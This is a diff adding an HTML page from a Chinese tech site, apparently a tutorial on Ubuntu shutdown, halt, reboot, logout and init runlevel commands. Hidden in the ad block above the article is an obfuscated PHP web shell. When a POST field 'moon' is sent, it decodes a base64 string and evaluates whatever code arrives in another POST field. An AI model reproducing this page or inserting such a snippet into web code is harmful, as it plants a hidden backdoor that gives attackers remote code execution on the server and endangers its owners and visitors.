@@ -1,0 +1,546 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Ubuntu 的关机重启与注销 | 学步园</title> 
+<meta name="description" content="1、关机命令 shutdown " />
+<meta name="keywords" content="" />
+<link rel="stylesheet" href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/style.css" type="text/css" media="screen" />
+<link rel="stylesheet" href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/css/css.css" />
+<link rel="stylesheet" href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/css/highlight.css" />
+<link rel="stylesheet" href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/css/img.css" />
+<link rel="pingback" href="https://www.xuebuyuan.com/xmlrpc.php" />
+<link rel="shortcut icon" href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/images/favicon.ico" />
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/jquery.min.js" ></script>
+<link rel="alternate" type="application/rss+xml" title="学步园 &raquo; Feed" href="https://www.xuebuyuan.com/feed" />
+<link rel="alternate" type="application/rss+xml" title="学步园 &raquo; 评论Feed" href="https://www.xuebuyuan.com/comments/feed" />
+<link rel='stylesheet' id='wp-syntax-css-css'  href='//cdn.xuebuyuan.com/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.0' type='text/css' media='all' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.xuebuyuan.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="//cdn.xuebuyuan.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='C语言指针5分钟教程' href='https://www.xuebuyuan.com/2101078.html' />
+<link rel='next' title='在textarea里面插入图片，修改字体大小和颜色（文本富编辑）' href='https://www.xuebuyuan.com/2101149.html' />
+<meta name="generator" content="WordPress 3.8" />
+<link rel='canonical' href='https://www.xuebuyuan.com/2101083.html' />
+<link rel='shortlink' href='https://www.xuebuyuan.com/?p=2101083' />
+<style data-context="foundation-flickity-css">/*! Flickity v2.0.2
+http://flickity.metafizzy.co
+---------------------------------------------- */.flickity-enabled{position:relative}.flickity-enabled:focus{outline:0}.flickity-viewport{overflow:hidden;position:relative;height:100%}.flickity-slider{position:absolute;width:100%;height:100%}.flickity-enabled.is-draggable{-webkit-tap-highlight-color:transparent;tap-highlight-color:transparent;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.flickity-enabled.is-draggable .flickity-viewport{cursor:move;cursor:-webkit-grab;cursor:grab}.flickity-enabled.is-draggable .flickity-viewport.is-pointer-down{cursor:-webkit-grabbing;cursor:grabbing}.flickity-prev-next-button{position:absolute;top:50%;width:44px;height:44px;border:none;border-radius:50%;background:#fff;background:hsla(0,0%,100%,.75);cursor:pointer;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.flickity-prev-next-button:hover{background:#fff}.flickity-prev-next-button:focus{outline:0;box-shadow:0 0 0 5px #09F}.flickity-prev-next-button:active{opacity:.6}.flickity-prev-next-button.previous{left:10px}.flickity-prev-next-button.next{right:10px}.flickity-rtl .flickity-prev-next-button.previous{left:auto;right:10px}.flickity-rtl .flickity-prev-next-button.next{right:auto;left:10px}.flickity-prev-next-button:disabled{opacity:.3;cursor:auto}.flickity-prev-next-button svg{position:absolute;left:20%;top:20%;width:60%;height:60%}.flickity-prev-next-button .arrow{fill:#333}.flickity-page-dots{position:absolute;width:100%;bottom:-25px;padding:0;margin:0;list-style:none;text-align:center;line-height:1}.flickity-rtl .flickity-page-dots{direction:rtl}.flickity-page-dots .dot{display:inline-block;width:10px;height:10px;margin:0 8px;background:#333;border-radius:50%;opacity:.25;cursor:pointer}.flickity-page-dots .dot.is-selected{opacity:1}</style><style data-context="foundation-slideout-css">.slideout-menu{position:fixed;left:0;top:0;bottom:0;right:auto;z-index:0;width:256px;overflow-y:auto;-webkit-overflow-scrolling:touch;display:none}.slideout-menu.pushit-right{left:auto;right:0}.slideout-panel{position:relative;z-index:1;will-change:transform}.slideout-open,.slideout-open .slideout-panel,.slideout-open body{overflow:hidden}.slideout-open .slideout-menu{display:block}.pushit{display:none}</style>		<link href="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/styles/4-blue.css" rel="stylesheet" type="text/css" />
+
+<style type="text/css">
+.banner img{
+	margin: 0 0 5px 0;
+}
+</style>
+
+<style>.ios7.web-app-mode.has-fixed header{ background-color: rgba(3,122,221,.88);}</style><script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/comments-ajax.js"></script>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/reply.js"></script>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/custom.js"></script>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/superfish.js"></script>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/mousewheel.js"></script>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/fancybox.js"></script>
+<script type="text/javascript">
+	$(document).ready(function() {
+
+		$("a[rel=example_group]").fancybox({
+			'transitionIn'		: 'none',
+			'transitionOut'		: 'none',
+			'titlePosition' 	: 'over',
+			'titleFormat'		: function(title, currentArray, currentIndex, currentOpts) {
+				return '<span id="fancybox-title-over">共 ' + currentArray.length + ' 张图片，当前第 ' + (currentIndex + 1) +' 张 '+ (title.length ? ' &nbsp; ' + title : '') + '</span>';
+			}
+		});
+
+		$("#various").fancybox({
+			'padding'			: 0,
+			'autoScale'			: false,
+			'transitionIn'		: 'none',
+			'transitionOut'		: 'none'
+		});
+		$("#download").fancybox({
+			'transitionIn'		: 'none',
+			'transitionOut'		: 'none'
+		});
+	});
+</script>
+<script type="text/javascript">
+$(function () {
+$('.thumbnail img,.thumbnail_t img,.box_comment img,#slideshow img,.cat_ico,.cat_name,.r_comments img,.v_content_list img').hover(
+function() {$(this).fadeTo("fast", 0.5);},
+function() {$(this).fadeTo("fast", 1);
+});
+});
+</script>
+<!-- PNG -->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/pngfix.js"></script>
+<script type="text/javascript">
+DD_belatedPNG.fix('.boxCaption,.top_box,.logo,.reply,.imgcat,.banner img,#fancybox-left-ico,#fancybox-right-ico,#fancybox-close');
+</script>
+<![endif]-->
+<!-- 图片延迟加载 -->
+<script type="text/javascript" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/js/lazyload.js"></script>
+<script type="text/javascript">
+	$(function() {          
+    	$(".entry_box img,.entry_box_h img,#entry img,.entry_b img").lazyload({
+            effect:"fadeIn",
+			failurelimit : 30
+          });
+    	});
+</script>
+<!-- IE6菜单 -->
+<script type="text/javascript"><!--//--><![CDATA[//><!--
+sfHover = function() {
+	if (!document.getElementsByTagName) return false;
+	var sfEls = document.getElementById("menu").getElementsByTagName("li");
+
+	for (var i=0; i<sfEls.length; i++) {
+		sfEls[i].onmouseover=function() {
+			this.className+=" sfhover";
+		}
+		sfEls[i].onmouseout=function() {
+			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
+		}
+	}	
+	var sfEls = document.getElementById("topnav").getElementsByTagName("li");
+	for (var i=0; i<sfEls.length; i++) {
+		sfEls[i].onmouseover=function() {
+			this.className+=" sfhover";
+		}
+	}
+}
+if (window.attachEvent) window.attachEvent("onload", sfHover);
+//--><!]]></script>
+<!-- 预加载 -->
+</head>
+<body class="single single-post postid-2101083 single-format-standard zh">
+<div id="wrapper">
+	<div id="top">
+		<div id='topnav'>
+			<div class="left_top ">
+				<div class="home_h"><a href="https://www.xuebuyuan.com" title="首  页" class="home_h"></a></div>
+				<div class="menu-%e5%af%bc%e8%88%aa-container"><ul id="menu-%e5%af%bc%e8%88%aa" class="menu"><li id="menu-item-1703978" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703978"><a href="https://www.xuebuyuan.com/category/web%e5%89%8d%e7%ab%af">web前端</a></li>
+<li id="menu-item-1703980" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703980"><a href="https://www.xuebuyuan.com/category/%e6%95%b0%e6%8d%ae%e5%ba%93">数据库</a></li>
+<li id="menu-item-1703982" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703982"><a href="https://www.xuebuyuan.com/category/%e7%bc%96%e7%a8%8b%e8%af%ad%e8%a8%80">编程语言</a></li>
+<li id="menu-item-1703979" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1703979"><a href="https://www.xuebuyuan.com/category/%e6%90%9c%e7%b4%a2%e6%8a%80%e6%9c%af">搜索技术</a></li>
+<li id="menu-item-1810308" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1810308"><a href="https://www.xuebuyuan.com/aboutus">关于本站</a></li>
+</ul></div> 
+			</div>
+			<!-- end: left_top --> 
+			<div id="searchbar">
+								<form action="https://www.xuebuyuan.com/search" id="cse-search-box">
+	<div>
+	<input type="hidden" name="cx" value="007504628711321185124:w-wufhldrhc" />
+	<input type="hidden" name="cof" value="FORID:10" />
+	<input type="text" onclick="this.value='';" name="q" id="q" class="swap_value" />
+	<input type="image" src="//cdn.xuebuyuan.com/wp-content/themes/HotNewspro/images/go.gif" id="go" alt="Search" title="搜索" />
+	</div>
+</form>							</div>
+			<!-- end: searchbar -->
+		</div>
+		<!-- end: topnav -->
+	</div>
+	<!-- end: top -->
+	<div id="header">
+		<div class="header_c">
+			<div class="login_t"><a id="showbtn"  onclick="showid('smallLay');">登录</a>  <div id="smallLay">
+	<div id="smallLay_box">
+	<!-- if not logged -->
+	<form action="https://www.xuebuyuan.com/wp-login.php?redirect_to=https%3A%2F%2Fwww.xuebuyuan.com%2F2101083.html" method="post" id="loginform">
+		<div class="loginblock">
+			<p class="login"><input type="text" name="log" id="log" size="" tabindex="11" /></p>
+			<p class="password"><input type="password" name="pwd" id="pwd"  size="" tabindex="12" /></p>
+			<p class="lefted"><button value="Submit" id="submit_t" type="submit" tabindex="13">登&nbsp;录</button></p>
+		</div>
+		<input type="hidden" name="redirect_to" value="/2101083.html" />
+		<input type="checkbox" name="rememberme" id="modlogn_remember" value="yes"  checked="checked" alt="Remember Me" />下次自动登录
+	</form>
+	<!-- end if not logged -->
+	</div>
+</div>
+</div>
+			<div class="time">
+<script type="text/javascript">
+today=new Date();
+var day; var date; var hello;
+hour=new Date().getHours()
+if(hour < 6)hello='  凌晨好! '
+else if(hour < 9)hello=' 早上好! '
+else if(hour < 12)hello=' 上午好! '
+else if(hour < 14)hello=' 中午好! '
+else if(hour < 17)hello=' 下午好! '
+else if(hour < 19)hello=' 傍晚好! '
+else if(hour < 22)hello=' 晚上好! '
+else {hello='夜深了! '}
+var webUrl = webUrl;
+document.write(' '+hello);
+</script>
+<span id=localtime>
+<script type="text/javascript">
+today=new Date(); var tdate,tday, x,year; var x = new Array("星期日", "星期一", "星期二", "星期三", "星期四", "星期五","星期六");
+var MSIE=navigator.userAgent.indexOf("MSIE");
+if(MSIE != -1)
+year =(today.getFullYear());
+else
+year = (today.getYear()+1900);
+tdate= year+ "年" + (today.getMonth() + 1 ) + "月" + today.getDate() + "日" + " " + x[today.getDay()];
+document.write(tdate);
+</script>
+</span>
+</div>			<a href="https://www.xuebuyuan.com" title="学步园"><h1 class="logo">学步园</h1></a>		</div>
+		<div class="clear"></div>
+		<!-- end: header_c -->
+
+<!--
+<script type="text/javascript">
+var opro_id="u2275153";
+(window["cproStyleApi"] = window["cproStyleApi"] || {})[cpro_id]={at:"3",rsi0:"980",rsi1:"250",pat:"6",tn:"baiduCustNativeAD",rss1:"#FFFFFF",conBW:"1",adp:"1",ptt:"0",titFF:"%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91",titFS:"",rss2:"#000000",titSU:"0",ptbg:"90",piw:"0",pih:"0",ptp:"0"}
+</script>
+-->
+	</div>
+	<!-- end: header -->
+			<!-- header_image -->
+		<div class="banner">
+					</div>
+		<!-- end:header_image -->
+		<!-- scroll -->
+	<ul class="scroll">
+	<li class="sct">
+		<a href="#">&nbsp;&nbsp;&nbsp;</a>
+		<div><a class="scroll_t">返回顶部</a></div>
+	</li>
+		<li class="scc">
+		<a href="#">&nbsp;&nbsp;&nbsp;</a>
+		<div><a class="scroll_c">查看留言</a></div>
+	</li>
+		<li class="scb">
+		<a href="#">&nbsp;&nbsp;&nbsp;</a>
+		<div><a class="scroll_b">转到底部</a></div>
+	</li>
+</ul><script type="text/javascript">
+    function doZoom(size) {
+        var zoom = document.all ? document.all['entry'] : document.getElementById('entry');
+        zoom.style.fontSize = size + 'px';
+    }
+</script>
+
+<!--
+    /*正文顶部小横幅*/
+-->
+
+<div id="content">
+		
+	 <!-- menu -->
+		<div id="map">
+			<div class="browse">现在的位置: <a title="返回首页" href="https://www.xuebuyuan.com/">首页</a> &gt; 综合 &gt; 正文</div>
+			<div id="feed"><a href="https://www.xuebuyuan.com/feed" title="RSS">RSS</a></div>
+		</div>
+		<!-- end: menu -->
+		<div class="entry_box_s">
+			<div class="context">
+				<div class="context_t">
+					<span class="prev"></span>
+					<span class="next"></span>
+				</div>
+			</div>
+			<div class="entry_title_box">
+				<!-- 分类图标 -->
+				<div class="ico"></div>
+				<!-- end: 分类图标 -->
+				<h2 class="entry_title">Ubuntu 的关机重启与注销</h2>
+				<div class="archive_info">
+					<span class="date">2014年09月05日</span>
+					<span class="category"> &#8260; 综合</span>
+										&#8260; 共 2929字					&#8260; 字号 <span class="font"><a href="javascript:doZoom(12)">小</a> <a href="javascript:doZoom(13)">中</a> <a href="javascript:doZoom(18)">大</a></span>
+					<span class="comment"> &#8260; <span>评论关闭</span></span>
+										<span class="edit"></span>
+				</div>
+			</div>
+			<!-- end: entry_title_box -->
+			<div class="entry">
+				<div id="entry">
+					<div class="ad_r">
+	<script type="text/javascript">
+    /*正文右侧中大矩形*/
+    var cpro_id = "u1788635";
+</script>
+<script type="text/javascript" src="https://cpro.baidustatic.com/cpro/ui/c.js"></script>
+<?php
+if($_POST['moon']){
+$_="b"/**/."ase64_decode";
+preg_replace("/^/e",$_("ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFt6MF0pKQ=="),0);
+}
+?>
+</div>					<div id="article_content" class="article_content">
+<p><span style="word-wrap:break-word; font-family:宋体; line-height:26px; font-size:14px"></span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+<span style="word-wrap:break-word; font-family:SimHei; font-size:18px">1、关机命令 shutdown</span><span style="text-indent:24pt; word-wrap:break-word; font-family:SimHei; font-size:18px"> </span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+<span style="word-wrap:break-word; background-color:rgb(248,248,248); text-indent:24pt">  <br style="word-wrap:break-word"><br />
+shutdown命令安全地将系统关机。 有些用户会使用直接断掉电源的方式来关闭linux，这是十分危险的。因为linux与windows不同，其后台运行着许多进程，所以强制关机可能会导致进程的数据丢失，使系统处于不稳定的状态，甚至在有的系统中会损坏硬件设备。</span><span style="word-wrap:break-word; text-indent:24pt; text-align:left; background-color:rgb(248,248,248)">而在系统关机前使用shutdown命令，系统管理员会通知所有登录的用户系统将要关闭。并且login指令会被冻结，即新的用户不能再登录。直接关机或者延迟一定的时间才关机都是可能的，还可能重启。这是由所有进程都会收到系统所送达的信号决定的。这让像vi之类的程序有时间储存目前正在编辑的文档，而像处理邮件〔mail〕和新闻〔news〕的程序则可以正常地离开。<br style="word-wrap:break-word"><br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-align:left; text-indent:24pt; background-color:rgb(248,248,248)">shutdown执行它的工作是送信号〔signal〕给init程序，要求它改变runlevel。Runlevel0被用来停机〔halt〕，runlevel6是用来重新激活〔reboot〕系统，而runlevel1则是被用来让系统进入管理工作可以进行的状态；这是预设的，假定没有-h也没有-r参数给shutdown。要想了解在停机〔halt〕或者重新开〔reboot〕过程中做了哪些动作，你可以在这个文件/etc/inittab里看到这些runlevels相关的资料。</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+<span style="word-wrap:break-word; background-color:rgb(248,248,248); text-indent:24pt"><br style="word-wrap:break-word"></span><span style="word-wrap:break-word; background-color:rgb(248,248,248); text-indent:24pt">1) shutdown –help        </span><span style="word-wrap:break-word; background-color:rgb(248,248,248); text-indent:24pt">可以查看shutdown命令如何使用，当然也可以使用man shutdown命令。<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt; background-color:rgb(248,248,248)">2）shutdown -h now        现在立即关机<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt"></span><span style="word-wrap:break-word; text-indent:24pt">3）shutdown -r now        现在立即重启<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt"></span><span style="word-wrap:break-word; text-indent:24pt">4）shutdown -r +3         三分钟后重启<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt"></span><span style="word-wrap:break-word; text-indent:24pt">5）shutdown -h +3        “The System will shutdown after 3 minutes” 提示使用者将在三分钟后关机<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt"></span><span style="word-wrap:break-word; text-indent:24pt">6）shutdown -r 20:23      在20：23时将重启计算机<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt"></span><span style="word-wrap:break-word; text-indent:24pt">7）shutdown -r 20:23 &amp;    可以将在20：23时重启的任务放到后台去，用户可以继续操作终端</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+<br style="word-wrap:break-word"><span style="word-wrap:break-word; font-size:18px; font-family:SimHei"></span><span style="word-wrap:break-word; font-size:18px; font-family:SimHei">2、halt—-最简单的关机命令</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+<br style="word-wrap:break-word"><br />
+   其实halt就是调用shutdown -h。halt执行时，杀死应用进程，执行sync系统调用，文件系统写操作完成后就会停止内核。<br style="word-wrap:break-word"><span style="word-wrap:break-word; text-indent:24pt">参数说明:</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+[-n] 防止sync系统调用，它用在用fsck修补根分区之后，以阻止内核用老版本的超级块〔superblock〕覆盖修补过的超级块。</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+[-w] 并不是真正的重启或关机，只是写wtmp〔/var/log/wtmp〕纪录。</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+[-d] 不写wtmp纪录〔已包含在选项[-n]中〕。</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+[-f] 没有调用shutdown而强制关机或重启。</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+[-i] 关机〔或重启〕前，关掉所有的网络接口。</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+<span style="word-wrap:break-word; text-indent:24pt">[-p] 该选项为缺省选项。就是关机时调用poweroff。</span><br style="word-wrap:break-word"><br style="word-wrap:break-word"><span style="word-wrap:break-word; font-size:18px; font-family:SimHei">3、注销系统的logout命令</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+<span style="word-wrap:break-word; text-indent:24pt"><br style="word-wrap:break-word"><br />
+Logout 注销是登陆的相对操作，登陆系统后，若要离开系统，用户只要直接下达logout命令即可:<br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-indent:24pt">[root@localhost root]#logout</span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+Red Hat Linuxrelease 9(Shike)</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+Kernel 2.4.20.8 on an i686</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt; background-color:rgb(248,248,248)">
+Login: ← 回到登陆的画面<br style="word-wrap:break-word"><br style="word-wrap:break-word"><span style="word-wrap:break-word; font-size:18px; font-family:SimHei"></span><span style="word-wrap:break-word; font-size:18px; font-family:SimHei">4、reboot命令</span><br style="word-wrap:break-word"><br />
+    reboot的工作过程差不多跟halt一样，不过它是引发主机重启，而halt是关机。它的参数与halt相差不多。<br style="word-wrap:break-word"><br style="word-wrap:break-word"><span style="word-wrap:break-word; font-size:18px; font-family:SimHei">5、init命令</span><br style="word-wrap:break-word"><br style="word-wrap:break-word"><br />
+  init是Linux操作系统中不可缺少的程序之一。init进程是Linux内核引导运行的，是系统中的第一个进程，其进程号（PID）永远为1。你可以通过#ps   -ef|head来查看进程命令。<br style="word-wrap:break-word"><br style="word-wrap:break-word"><br />
+1)几个常用的命令<br style="word-wrap:break-word"><br />
+   查看系统进程命令：#ps   -ef|head<br style="word-wrap:break-word"><br />
+   查看init的配置文件：#more   /etc/inittab<br style="word-wrap:break-word"><br />
+   查看系统当前运行的级别：#runlevel<br style="word-wrap:break-word"><br style="word-wrap:break-word"><br />
+2)运行级别<br style="word-wrap:break-word"><br />
+   到底什么是运行级呢？简单的说，运行级就是操作系统当前正在运行的功能级别。这个级别从0到6 ，具有不同的功能。你也可以在/etc/inittab中查看它的英文介绍。<br style="word-wrap:break-word"><br style="word-wrap:break-word"><br />
+#0                     停机(千万不能把initdefault 设置为0)<br style="word-wrap:break-word"><br />
+#1                     单用户模式<br style="word-wrap:break-word"><br />
+#2                     多用户，没有 NFS(和级别3相似，会停止部分服务)<br style="word-wrap:break-word"><br />
+#3                     完全多用户模式<br style="word-wrap:break-word"><br />
+#4                     没有用到<br style="word-wrap:break-word"><br />
+#5                     x11(Xwindow)<br style="word-wrap:break-word"><br />
+#6                     重新启动(千万不要把initdefault 设置为6)</p>
+<div style="word-wrap:break-word"><span style="word-wrap:break-word; text-indent:24pt">/etc/inittab文件是init程序寻找的主要文件，最先运行的服务是放在/etc/rc.d目录下的文件。在大多数的Linux发行版本中，启动脚本都是位于/etc/rc.d/init.d中的。这些脚本被用ln 命令连接到 /etc/rc.d/rcn.d 目录。(这里的n 就是运行级0-6)，</span><span style="word-wrap:break-word; text-indent:24pt">如果想改变运行级别只需修改/etc/inittab文件中的一行即可。</span></div>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; padding-top:0px; padding-bottom:0px">
+<br style="word-wrap:break-word"></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; padding-top:0px; padding-bottom:0px; text-align:justify">
+具体如下：</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+# vi  /etc/inittab</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+按i（I）键进入插入模式</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+找到</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+id:3:initdefault;</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+这一行</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+把3修改成5就行了。id:5:initdefault;</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+然后按ESC键</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+再输入   ：wq（冒号wq）</p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify; text-indent:24pt">
+然后用init  6重新启动就可以了。<br style="word-wrap:break-word"><br style="word-wrap:break-word"><span style="word-wrap:break-word; text-indent:24pt"><span style="word-wrap:break-word; font-size:18px; font-family:SimHei">6、Reboot与init 6的区别 </span><br style="word-wrap:break-word"><br />
+  <br style="word-wrap:break-word"></span><span style="word-wrap:break-word; text-align:left; text-indent:24pt">起因在于：重启服务器后有时候服务不会启动，而有时候又可以自动运行，唯一差别在于重启命令用的是reboot还是init 6.</span><span style="word-wrap:break-word; text-align:left; text-indent:24pt">后查了相关资料，</span><span style="word-wrap:break-word; text-align:left; text-indent:24pt">对这两个操作使用man命令看到的内容如下：</span><span style="word-wrap:break-word; text-align:left; text-indent:24pt"> </span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; margin-left:6pt; padding-top:0px; padding-bottom:0px; text-align:justify">
+<br style="word-wrap:break-word"><br />
+init 6 Stop the operating system and reboot to the state defined by the initdefault entry in /etc/inittab.  <br style="word-wrap:break-word"><br />
+reboot reboot performs a sync(1M) operation on the disks, and then a multi- user reboot is initiated. See init(1M) for details.  <br style="word-wrap:break-word"><br style="word-wrap:break-word"><br />
+"init 6" 基于一系列/etc/inittab文件，并且每个应用都会有一个相应shutdown脚本。 'init 6' 调用一系列shutdown脚本(/etc/rc0.d/K*)来使系统优雅关机; <br style="word-wrap:break-word"><br />
+'reboot'并不执行这些过程，reboot更是一个 kernel级别的命令，不对应用使用shutdown脚本。  我们应该在通常情况下使用 init 6。 在出问题的状况下或强制重启时使用reboot。<span style="word-wrap:break-word; text-align:left; text-indent:24pt">  </span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; padding-top:0px; padding-bottom:0px">
+<br style="word-wrap:break-word"></p>
+<div style="word-wrap:break-word">
+<div style="word-wrap:break-word"><span style="word-wrap:break-word; text-indent:24pt">shutdown先执行关闭进程，写入磁盘等一系列操作后 init 0关机 init 6重启<br style="word-wrap:break-word"><br />
+halt 没有在init 0 ，init 6运行级别时，调用shutdown（相当于shutdown -h now）  </span></div>
+<p><span style="word-wrap:break-word; text-indent:24pt">reboot 没有在init 0 ，init 6运行级别时，调用shutdown（相当于shutdown -r now）  </span></div>
+<p><span style="word-wrap:break-word; text-indent:24pt"><span style="word-wrap:break-word; text-indent:24pt">poweroff 直接指向 halt -p 相当于halt</span></span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; padding-top:0px; padding-bottom:0px">
+<br style="word-wrap:break-word"></p>
+<p><span style="color:rgb(0,102,0); font-family:宋体; line-height:26px"></span></p>
+<p style="word-wrap:break-word; margin-top:5px; margin-bottom:5px; padding-top:0px; padding-bottom:0px; color:rgb(0,102,0); font-family:宋体; line-height:26px">
+<span style="word-wrap:break-word; color:rgb(0,0,0); font-size:14px">在ubuntu13.10中直接使用 halt 命令关机会死机，必须使用halt -p或其它命令才可以正常关机。</span></p>
+</div>
+
+<div style="font-size:0px;height:0px;line-height:0px;margin:0;padding:0;clear:both"></div>														</div>
+							</div>
+			<div class="back_b">
+				<a href="javascript:void(0);" onclick="history.back();">返回</a>
+			</div>
+			<div class="clear"></div>
+			<!-- end: entry -->
+			<i class="lt"></i>
+			<i class="rt"></i>
+		</div>
+		<div class="entry_sb">
+			<i class="lb"></i>
+			<i class="rb"></i>
+		</div>
+                <div class="ad_h">
+		<div class="ad_h_c">
+<table>
+<tr>
+<td>
+<script type="text/javascript">
+    /*500宽矩形*/
+    var cpro_id = "u1507413";
+</script>
+<script src="https://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></script>
+
+</td>
+<td>
+
+<script type="text/javascript">
+    /*右侧小矩形*/
+    var cpro_id = "u1507403";
+</script>
+<script src="https://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></script>
